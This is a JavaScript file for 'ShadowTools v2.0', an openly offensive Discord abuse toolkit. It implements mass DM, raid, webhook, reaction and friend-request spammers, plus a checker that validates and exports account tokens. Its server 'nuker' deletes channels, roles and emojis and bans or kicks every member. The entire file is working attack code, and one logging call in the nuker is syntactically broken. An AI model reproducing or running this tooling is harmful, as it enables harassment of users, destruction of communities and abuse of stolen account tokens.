// ShadowTools v2.0 - Complete Implementation
const API_BASE = 'https://discord.com/api/v9';
let stopFlags = {};

// Utility Functions
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const randomString = (length) => {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
};

const log = (element, message, type = 'info') => {
  const div = document.createElement('div');
  div.className = type;
  div.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
  element.appendChild(div);
  element.scrollTop = element.scrollHeight;
};

const getLines = (textarea) => textarea.value.split('\n').filter(line => line.trim());

// Navigation
document.querySelectorAll('.nav-btn').forEach(btn => {
  btn.addEventListener('click', () => {
    document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('.tool-panel').forEach(p => p.classList.remove('active'));
    btn.classList.add('active');
    document.getElementById(`${btn.dataset.tool}-panel`).classList.add('active');
  });
});

// ==================== MASS DM SPAMMER ====================
let dmStopFlag = false;

document.getElementById('startDmBtn').addEventListener('click', async () => {
  const tokens = getLines(document.getElementById('dmTokens'));
  const targets = getLines(document.getElementById('dmTargets'));
  const message = document.getElementById('dmMessage').value;
  const count = parseInt(document.getElementById('dmCount').value);
  const delay = parseInt(document.getElementById('dmDelay').value);
  const logBox = document.getElementById('dmLog');
  
  if (!tokens.length || !targets.length || !message) {
    log(logBox, '全てのフィールドを入力してください', 'error');
    return;
  }
  
  dmStopFlag = false;
  document.getElementById('startDmBtn').disabled = true;
  log(logBox, `開始: ${tokens.length} tokens × ${targets.length} targets × ${count} messages`, 'info');
  
  let sent = 0;
  
  for (let i = 0; i < count && !dmStopFlag; i++) {
    const promises = tokens.map(async (token) => {
      for (const target of targets) {
        if (dmStopFlag) break;
        
        try {
          const channelRes = await fetch(`${API_BASE}/users/@me/channels`, {
            method: 'POST',
            headers: {
              'Authorization': token.trim(),
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({ recipient_id: target.trim() })
          });
          
          if (!channelRes.ok) {
            log(logBox, `Failed to create DM: ${target}`, 'error');
            continue;
          }
          
          const channel = await channelRes.json();
          
          const msgRes = await fetch(`${API_BASE}/channels/${channel.id}/messages`, {
            method: 'POST',
            headers: {
              'Authorization': token.trim(),
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({ content: message })
          });
          
          if (msgRes.ok) {
            sent++;
            log(logBox, `Sent to ${target}`, 'success');
          } else {
            log(logBox, `Failed: ${target} (${msgRes.status})`, 'error');
          }
        } catch (err) {
          log(logBox, `Error: ${err.message}`, 'error');
        }
      }
    });
    
    await Promise.all(promises);
    if (delay > 0 && i < count - 1) await sleep(delay);
  }
  
  log(logBox, `完了: ${sent} messages sent`, 'success');
  document.getElementById('startDmBtn').disabled = false;
});

document.getElementById('stopDmBtn').addEventListener('click', () => {
  dmStopFlag = true;
  log(document.getElementById('dmLog'), '停止しました', 'warning');
  document.getElementById('startDmBtn').disabled = false;
});

// ==================== RAIDER ====================
let raidStopFlag = false;

document.getElementById('startRaidBtn').addEventListener('click', async () => {
  const tokens = getLines(document.getElementById('raidTokens'));
  const guildId = document.getElementById('raidGuild').value.trim();
  const channelId = document.getElementById('raidChannel').value.trim();
  let message = document.getElementById('raidMessage').value;
  const threads = parseInt(document.getElementById('raidThreads').value);
  const delay = parseInt(document.getElementById('raidDelay').value);
  const mentionAll = document.getElementById('raidMention').checked;
  const massPing = document.getElementById('raidPing').checked;
  const tts = document.getElementById('raidTts').checked;
  const logBox = document.getElementById('raidLog');
  
  if (!tokens.length || !channelId) {
    log(logBox, 'TokensとChannel IDを入力してください', 'error');
    return;
  }
  
  raidStopFlag = false;
  document.getElementById('startRaidBtn').disabled = true;
  log(logBox, `RAID開始: ${tokens.length} tokens, ${threads} threads`, 'info');
  
  let members = [];
  if (massPing && guildId) {
    try {
      const res = await fetch(`${API_BASE}/guilds/${guildId}/members?limit=1000`, {
        headers: { 'Authorization': tokens[0] }
      });
      if (res.ok) {
        members = await res.json();
        log(logBox, `${members.length} members loaded for ping`, 'info');
      }
    } catch (e) {
      log(logBox, 'Failed to load members', 'warning');
    }
  }
  
  const raidWorker = async (token) => {
    while (!raidStopFlag) {
      let content = message;
      if (mentionAll) content += ' @everyone @here';
      if (massPing && members.length) {
        const pings = members.slice(0, 10).map(m => `<@${m.user.id}>`).join(' ');
        content += ' ' + pings;
      }
      
      try {
        const res = await fetch(`${API_BASE}/channels/${channelId}/messages`, {
          method: 'POST',
          headers: {
            'Authorization': token.trim(),
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ 
            content: content,
            tts: tts
          })
        });
        
        if (res.status === 429) {
          const data = await res.json();
          await sleep(data.retry_after * 1000);
        } else if (res.ok) {
          log(logBox, `Sent: ${token.slice(0, 20)}...`, 'success');
        } else {
          log(logBox, `Failed: ${res.status}`, 'error');
        }
      } catch (err) {
        log(logBox, `Error: ${err.message}`, 'error');
      }
      
      if (delay > 0) await sleep(delay);
    }
  };
  
  const workers = [];
  for (let i = 0; i < threads; i++) {
    const token = tokens[i % tokens.length];
    workers.push(raidWorker(token));
  }
  
  await Promise.all(workers);
  log(logBox, 'RAID停止', 'warning');
  document.getElementById('startRaidBtn').disabled = false;
});

document.getElementById('stopRaidBtn').addEventListener('click', () => {
  raidStopFlag = true;
  log(document.getElementById('raidLog'), '停止中...', 'warning');
});

document.getElementById('leaveGuildBtn').addEventListener('click', async () => {
  const tokens = getLines(document.getElementById('raidTokens'));
  const guildId = document.getElementById('raidGuild').value.trim();
  const logBox = document.getElementById('raidLog');
  
  if (!tokens.length || !guildId) {
    log(logBox, 'TokensとGuild IDを入力してください', 'error');
    return;
  }
  
  log(logBox, `Leaving guild with ${tokens.length} tokens...`, 'info');
  
  for (const token of tokens) {
    try {
      const res = await fetch(`${API_BASE}/users/@me/guilds/${guildId}`, {
        method: 'DELETE',
        headers: { 'Authorization': token.trim() }
      });
      
      if (res.ok || res.status === 204) {
        log(logBox, `Left: ${token.slice(0, 20)}...`, 'success');
      } else {
        log(logBox, `Failed: ${res.status}`, 'error');
      }
    } catch (err) {
      log(logBox, `Error: ${err.message}`, 'error');
    }
  }
});

// ==================== WEBHOOK SPAMMER ====================
let webhookStopFlag = false;

document.getElementById('startWebhookBtn').addEventListener('click', async () => {
  const urls = getLines(document.getElementById('webhookUrls'));
  const message = document.getElementById('webhookMessage').value;
  const name = document.getElementById('webhookName').value;
  const avatar = document.getElementById('webhookAvatar').value;
  const count = parseInt(document.getElementById('webhookCount').value);
  const delay = parseInt(document.getElementById('webhookDelay').value);
  const useEmbed = document.getElementById('webhookEmbed').checked;
  const autoDelete = document.getElementById('webhookDelete').checked;
  const logBox = document.getElementById('webhookLog');
  
  if (!urls.length || !message) {
    log(logBox, 'Webhook URLsとメッセージを入力してください', 'error');
    return;
  }
  
  webhookStopFlag = false;
  document.getElementById('startWebhookBtn').disabled = true;
  log(logBox, `Webhook spam開始: ${urls.length} URLs × ${count}`, 'info');
  
  let sent = 0;
  
  for (let i = 0; i < count && !webhookStopFlag; i++) {
    const promises = urls.map(async (url) => {
      try {
        let payload = { content: message };
        
        if (useEmbed) {
          try {
            payload = { embeds: [JSON.parse(message)] };
          } catch {
            payload = {
              embeds: [{
                title: 'ShadowTools',
                description: message,
                color: 0x00f0ff,
                timestamp: new Date().toISOString()
              }]
            };
          }
        }
        
        if (name) payload.username = name;
        if (avatar) payload.avatar_url = avatar;
        
        const res = await fetch(url.trim(), {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        
        if (res.ok) {
          sent++;
          log(logBox, `Sent to webhook`, 'success');
          
          if (autoDelete) {
            const webhookId = url.match(/webhooks\/(\d+)/)?.[1];
            const webhookToken = url.match(/webhooks\/\d+\/(.+)/)?.[1];
            if (webhookId && webhookToken) {
              await sleep(100);
              await fetch(`${API_BASE}/webhooks/${webhookId}/${webhookToken}`, {
                method: 'DELETE'
              });
            }
          }
        } else {
          log(logBox, `Failed: ${res.status}`, 'error');
        }
      } catch (err) {
        log(logBox, `Error: ${err.message}`, 'error');
      }
    });
    
    await Promise.all(promises);
    if (delay > 0) await sleep(delay);
  }
  
  log(logBox, `完了: ${sent} messages sent`, 'success');
  document.getElementById('startWebhookBtn').disabled = false;
});

document.getElementById('stopWebhookBtn').addEventListener('click', () => {
  webhookStopFlag = true;
  log(document.getElementById('webhookLog'), '停止しました', 'warning');
  document.getElementById('startWebhookBtn').disabled = false;
});

document.getElementById('deleteWebhookBtn').addEventListener('click', async () => {
  const urls = getLines(document.getElementById('webhookUrls'));
  const logBox = document.getElementById('webhookLog');
  
  log(logBox, 'Deleting webhooks...', 'info');
  
  for (const url of urls) {
    try {
      const res = await fetch(url.trim(), { method: 'DELETE' });
      if (res.ok || res.status === 204) {
        log(logBox, `Deleted: ${url.slice(0, 50)}...`, 'success');
      } else {
        log(logBox, `Failed: ${res.status}`, 'error');
      }
    } catch (err) {
      log(logBox, `Error: ${err.message}`, 'error');
    }
  }
});

// ==================== TOKEN CHECKER ====================
document.getElementById('checkTokenBtn').addEventListener('click', async () => {
  const tokens = getLines(document.getElementById('checkTokens'));
  const logBox = document.getElementById('checkLog');
  const validEl = document.getElementById('validCount');
  const invalidEl = document.getElementById('invalidCount');
  const lockedEl = document.getElementById('lockedCount');
  
  if (!tokens.length) {
    log(logBox, 'Tokensを入力してください', 'error');
    return;
  }
  
  let valid = 0, invalid = 0, locked = 0;
  const validTokens = [];
  
  log(logBox, `${tokens.length} tokens checking...`, 'info');
  
  for (const token of tokens) {
    try {
      const res = await fetch(`${API_BASE}/users/@me`, {
        headers: { 'Authorization': token.trim() }
      });
      
      if (res.ok) {
        const user = await res.json();
        valid++;
        validTokens.push(token);
        log(logBox, `✓ Valid: ${user.username}#${user.discriminator} (${user.id})`, 'success');
      } else if (res.status === 403) {
        locked++;
        log(logBox, `⚠ Locked: ${token.slice(0, 30)}...`, 'warning');
      } else {
        invalid++;
        log(logBox, `✗ Invalid: ${token.slice(0, 30)}...`, 'error');
      }
    } catch (err) {
      invalid++;
      log(logBox, `✗ Error: ${token.slice(0, 30)}...`, 'error');
    }
    
    validEl.textContent = valid;
    invalidEl.textContent = invalid;
    lockedEl.textContent = locked;
  }
  
  log(logBox, `完了: Valid ${valid}, Invalid ${invalid}, Locked ${locked}`, 'info');
  
  window.validTokens = validTokens;
});

document.getElementById('exportValidBtn').addEventListener('click', () => {
  if (!window.validTokens || !window.validTokens.length) {
    log(document.getElementById('checkLog'), '有効なトークンがありません', 'error');
    return;
  }
  
  const blob = new Blob([window.validTokens.join('\n')], { type: 'text/plain' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = 'valid_tokens.txt';
  a.click();
  URL.revokeObjectURL(url);
  
  log(document.getElementById('checkLog'), '有効トークンを保存しました', 'success');
});

// ==================== REACTION SPAMMER ====================
let reactStopFlag = false;

document.getElementById('startReactBtn').addEventListener('click', async () => {
  const tokens = getLines(document.getElementById('reactTokens'));
  const channelId = document.getElementById('reactChannel').value.trim();
  const messageId = document.getElementById('reactMessage').value.trim();
  const emojis = getLines(document.getElementById('reactEmojis'));
  const logBox = document.getElementById('reactLog');
  
  if (!tokens.length || !channelId || !messageId || !emojis.length) {
    log(logBox, '全てのフィールドを入力してください', 'error');
    return;
  }
  
  reactStopFlag = false;
  document.getElementById('startReactBtn').disabled = true;
  log(logBox, `Reaction spam開始`, 'info');
  
  for (const token of tokens) {
    if (reactStopFlag) break;
    
    for (const emoji of emojis) {
      try {
        let emojiParam = encodeURIComponent(emoji.trim());
        if (emoji.includes(':')) {
          const [name, id] = emoji.split(':');
          emojiParam = `${name}:${id}`;
        }
        
        const res = await fetch(
          `${API_BASE}/channels/${channelId}/messages/${messageId}/reactions/${emojiParam}/@me`,
          {
            method: 'PUT',
            headers: { 'Authorization': token.trim() }
          }
        );
        
        if (res.ok || res.status === 204) {
          log(logBox, `Reacted: ${emoji}`, 'success');
        } else if (res.status === 429) {
          const data = await res.json();
          await sleep(data.retry_after * 1000);
        } else {
          log(logBox, `Failed: ${res.status}`, 'error');
        }
      } catch (err) {
        log(logBox, `Error: ${err.message}`, 'error');
      }
      
      await sleep(100);
    }
  }
  
  log(logBox, '完了', 'success');
  document.getElementById('startReactBtn').disabled = false;
});

document.getElementById('stopReactBtn').addEventListener('click', () => {
  reactStopFlag = true;
  log(document.getElementById('reactLog'), '停止しました', 'warning');
});

// ==================== SERVER NUKER ====================
document.getElementById('startNukeBtn').addEventListener('click', async () => {
  const token = document.getElementById('nukeToken').value.trim();
  const guildId = document.getElementById('nukeGuild').value.trim();
  const newName = document.getElementById('nukeName').value.trim();
  const deleteChannels = document.getElementById('nukeChannels').checked;
  const deleteRoles = document.getElementById('nukeRoles').checked;
  const deleteEmojis = document.getElementById('nukeEmojis').checked;
  const deleteInvites = document.getElementById('nukeInvites').checked;
  const banAll = document.getElementById('nukeBan').checked;
  const kickAll = document.getElementById('nukeKick').checked;
  const logBox = document.getElementById('nukeLog');
  
  if (!token || !guildId) {
    log(logBox, 'TokenとGuild IDを入力してください', 'error');
    return;
  }
  
  if (!confirm('本当にサーバーを破壊しますか？この操作は元に戻せません！')) {
    return;
  }
  
  log(logBox, '💣 NUKE開始...', 'error');
  
  // Get guild info
  let guild;
  try {
    const res = await fetch(`${API_BASE}/guilds/${guildId}`, {
      headers: { 'Authorization': `Bot ${token}` }
    });
    if (res.ok) guild = await res.json();
  } catch (e) {}
  
  if (newName && guild) {
    try {
      await fetch(`${API_BASE}/guilds/${guildId}`, {
        method: 'PATCH',
        headers: {
          'Authorization': `Bot ${token}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ name: newName })
      });
      log(logBox, `Server renamed to: ${newName}`, 'success');
    } catch (e) {
      log(logBox, 'Failed to rename server', 'error');
    }
  }
  
  // Delete channels
  if (deleteChannels) {
    try {
      const res = await fetch(`${API_BASE}/guilds/${guildId}/channels`, {
        headers: { 'Authorization': `Bot ${token}` }
      });
      if (res.ok) {
        const channels = await res.json();
        log(logBox `${channels.length} channels found`, 'info');
        
        for (const channel of channels) {
          try {
            await fetch(`${API_BASE}/channels/${channel.id}`, {
              method: 'DELETE',
              headers: { 'Authorization': `Bot ${token}` }
            });
            log(logBox, `Deleted: #${channel.name}`, 'success');
          } catch (e) {
            log(logBox, `Failed: #${channel.name}`, 'error');
          }
          await sleep(100);
        }
      }
    } catch (e) {
      log(logBox, 'Failed to get channels', 'error');
    }
  }
  
  // Delete roles
  if (deleteRoles) {
    try {
      const res = await fetch(`${API_BASE}/guilds/${guildId}/roles`, {
        headers: { 'Authorization': `Bot ${token}` }
      });
      if (res.ok) {
        const roles = await res.json();
        for (const role of roles) {
          if (role.managed) continue;
          try {
            await fetch(`${API_BASE}/guilds/${guildId}/roles/${role.id}`, {
              method: 'DELETE',
              headers: { 'Authorization': `Bot ${token}` }
            });
            log(logBox, `Deleted role: ${role.name}`, 'success');
          } catch (e) {}
          await sleep(100);
        }
      }
    } catch (e) {}
  }
  
  // Delete emojis
  if (deleteEmojis) {
    try {
      const res = await fetch(`${API_BASE}/guilds/${guildId}/emojis`, {
        headers: { 'Authorization': `Bot ${token}` }
      });
      if (res.ok) {
        const emojis = await res.json();
        for (const emoji of emojis) {
          try {
            await fetch(`${API_BASE}/guilds/${guildId}/emojis/${emoji.id}`, {
              method: 'DELETE',
              headers: { 'Authorization': `Bot ${token}` }
            });
            log(logBox, `Deleted emoji: ${emoji.name}`, 'success');
          } catch (e) {}
        }
      }
    } catch (e) {}
  }
  
  // Ban/Kick members
  if (banAll || kickAll) {
    try {
      const res = await fetch(`${API_BASE}/guilds/${guildId}/members?limit=1000`, {
        headers: { 'Authorization': `Bot ${token}` }
      });
      if (res.ok) {
        const members = await res.json();
        for (const member of members) {
          if (member.user.bot) continue;
          try {
            if (banAll) {
              await fetch(`${API_BASE}/guilds/${guildId}/bans/${member.user.id}`, {
                method: 'PUT',
                headers: {
                  'Authorization': `Bot ${token}`,
                  'Content-Type': 'application/json'
                },
                body: JSON.stringify({ delete_message_days: 7, reason: 'Nuked by ShadowTools' })
              });
              log(logBox, `Banned: ${member.user.username}`, 'success');
            } else if (kickAll) {
              await fetch(`${API_BASE}/guilds/${guildId}/members/${member.user.id}`, {
                method: 'DELETE',
                headers: { 'Authorization': `Bot ${token}` }
              });
              log(logBox, `Kicked: ${member.user.username}`, 'success');
            }
          } catch (e) {}
          await sleep(100);
        }
      }
    } catch (e) {}
  }
  
  log(logBox, '💥 NUKE完了', 'error');
});

// ==================== FRIEND REQUEST SPAMMER ====================
let friendStopFlag = false;

document.getElementById('startFriendBtn').addEventListener('click', async () => {
  const tokens = getLines(document.getElementById('friendTokens'));
  const targets = getLines(document.getElementById('friendTargets'));
  const delay = parseInt(document.getElementById('friendDelay').value);
  const logBox = document.getElementById('friendLog');
  
  if (!tokens.length || !targets.length) {
    log(logBox, 'Tokensとターゲットを入力してください', 'error');
    return;
  }
  
  friendStopFlag = false;
  document.getElementById('startFriendBtn').disabled = true;
  log(logBox, `Friend request開始`, 'info');
  
  for (const token of tokens) {
    if (friendStopFlag) break;
    
    for (const target of targets) {
      const [username, discriminator] = target.split('#');
      if (!username || !discriminator) continue;
      
      try {
        const res = await fetch(`${API_BASE}/users/@me/relationships`, {
          method: 'POST',
          headers: {
            'Authorization': token.trim(),
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ username: username.trim(), discriminator: parseInt(discriminator) })
        });
        
        if (res.ok || res.status === 204) {
          log(logBox, `Sent to: ${target}`, 'success');
        } else if (res.status === 429) {
          const data = await res.json();
          await sleep(data.retry_after * 1000);
        } else {
          log(logBox, `Failed: ${target} (${res.status})`, 'error');
        }
      } catch (err) {
        log(logBox, `Error: ${err.message}`, 'error');
      }
      
      if (delay > 0) await sleep(delay);
    }
  }
  
  log(logBox, '完了', 'success');
  document.getElementById('startFriendBtn').disabled = false;
});

document.getElementById('stopFriendBtn').addEventListener('click', () => {
  friendStopFlag = true;
  log(document.getElementById('friendLog'), '停止しました', 'warning');
});

// ==================== NICKNAME CHANGER ====================
document.getElementById('startNickBtn').addEventListener('click', async () => {
  const token = document.getElementById('nickToken').value.trim();
  const guildId = document.getElementById('nickGuild').value.trim();
  const nickname = document.getElementById('nickName').value.trim();
  const random = document.getElementById('nickRandom').checked;
  const onlyMe = document.getElementById('nickMe').checked;
  const logBox = document.getElementById('nickLog');
  
  if (!token || !guildId) {
    log(logBox, 'TokenとGuild IDを入力してください', 'error');
    return;
  }
  
  log(logBox, 'Nickname change開始...', 'info');
  
  if (onlyMe) {
    try {
      const res = await fetch(`${API_BASE}/guilds/${guildId}/members/@me`, {
        method: 'PATCH',
        headers: {
          'Authorization': token,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ nick: random ? `${nickname}_${randomString(4)}` : nickname })
      });
      
      if (res.ok) {
        log(logBox, 'Nickname changed', 'success');
      } else {
        log(logBox, `Failed: ${res.status}`, 'error');
      }
    } catch (err) {
      log(logBox, `Error: ${err.message}`, 'error');
    }
  } else {
    try {
      const res = await fetch(`${API_BASE}/guilds/${guildId}/members?limit=1000`, {
        headers: { 'Authorization': `Bot ${token}` }
      });
      
      if (res.ok) {
        const members = await res.json();
        for (const member of members) {
          try {
            await fetch(`${API_BASE}/guilds/${guildId}/members/${member.user.id}`, {
              method: 'PATCH',
              headers: {
                'Authorization': `Bot ${token}`,
                'Content-Type': 'application/json'
              },
              body: JSON.stringify({ nick: random ? `${nickname}_${randomString(4)}` : nickname })
            });
            log(logBox, `Changed: ${member.user.username}`, 'success');
          } catch (e) {
            log(logBox, `Failed: ${member.user.username}`, 'error');
          }
          await sleep(100);
        }
      }
    } catch (e) {
      log(logBox, 'Failed to get members', 'error');
    }
  }
  
  log(logBox, '完了', 'success');
});

// ==================== MASS ROLE CREATOR ====================
let roleStopFlag = false;

document.getElementById('startRoleBtn').addEventListener('click', async () => {
  const token = document.getElementById('roleToken').value.trim();
  const guildId = document.getElementById('roleGuild').value.trim();
  const names = getLines(document.getElementById('roleNames'));
  const color = document.getElementById('roleColor').value.replace('#', '0x');
  const hoist = document.getElementById('roleHoist').checked;
  const mentionable = document.getElementById('roleMention').checked;
  const count = parseInt(document.getElementById('roleCount').value);
  const delay = parseInt(document.getElementById('roleDelay').value);
  const logBox = document.getElementById('roleLog');
  
  if (!token || !guildId || !names.length) {
    log(logBox, '全てのフィールドを入力してください', 'error');
    return;
  }
  
  roleStopFlag = false;
  document.getElementById('startRoleBtn').disabled = true;
  log(logBox, `Role creation開始`, 'info');
  
  let created = 0;
  
  for (let i = 0; i < count && !roleStopFlag; i++) {
    for (const name of names) {
      try {
        const res = await fetch(`${API_BASE}/guilds/${guildId}/roles`, {
          method: 'POST',
          headers: {
            'Authorization': `Bot ${token}`,
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            name: `${name}_${randomString(4)}`,
            color: parseInt(color),
            hoist: hoist,
            mentionable: mentionable,
            permissions: '0'
          })
        });
        
        if (res.ok) {
          created++;
          log(logBox, `Created: ${name}`, 'success');
        } else {
          log(logBox, `Failed: ${res.status}`, 'error');
        }
      } catch (err) {
        log(logBox, `Error: ${err.message}`, 'error');
      }
      
      if (delay > 0) await sleep(delay);
    }
  }
  
  log(logBox, `完了: ${created} roles created`, 'success');
  document.getElementById('startRoleBtn').disabled = false;
});

document.getElementById('stopRoleBtn').addEventListener('click', () => {
  roleStopFlag = true;
  log(document.getElementById('roleLog'), '停止しました', 'warning');
});

// Initialize
log(document.getElementById('dmLog'), 'ShadowTools v2.0 loaded', 'success');
